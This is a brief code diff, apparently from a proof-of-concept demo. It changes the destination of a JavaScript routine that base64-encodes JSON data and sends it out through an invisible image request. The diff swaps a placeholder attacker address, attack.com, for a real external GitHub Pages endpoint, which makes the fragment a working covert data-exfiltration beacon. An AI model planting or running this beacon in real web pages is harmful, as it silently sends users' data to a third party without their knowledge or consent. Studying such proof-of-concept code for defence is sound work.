@@ -43,7 +43,7 @@
                 const base64Data = btoa(encodeURIComponent(jsonString).replace(/%([0-9A-F]{2})/g, function(match, p1) {
                     return String.fromCharCode("0x" + p1)
                 }));
-                const url = "http://attack.com/?data=" + base64Data + "&source=direct_link";
+                const url = "https://lyt-web.github.io/pocdemo.github.io/?data=" + base64Data + "&source=direct_link";
                 const img = new Image();
                 img.src = url;
                 img.style.display = "none";
